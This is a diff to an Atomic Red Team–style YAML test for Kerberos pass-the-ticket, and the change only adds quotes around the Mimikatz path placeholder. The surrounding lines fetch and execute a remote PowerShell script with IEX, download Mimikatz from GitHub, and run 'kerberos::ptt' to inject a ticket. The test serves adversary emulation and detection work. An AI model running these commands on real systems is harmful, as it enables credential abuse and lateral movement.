@@ -21,18 +21,18 @@ atomic_tests:
   - description: |
       Mimikatz must exist on disk at specified location (#{mimikatz_exe})
     prereq_command: |
-      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+      if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
       $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
       $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
-      $basePath = Split-Path #{mimikatz_exe} | Split-Path
+      $basePath = Split-Path "#{mimikatz_exe}" | Split-Path
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
   executor:
     command: |
-      #{mimikatz_exe} "kerberos::ptt #{ticket}"
+      "#{mimikatz_exe}" "kerberos::ptt #{ticket}"
     name: command_prompt
 - name: Rubeus Kerberos Pass The Ticket
   auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
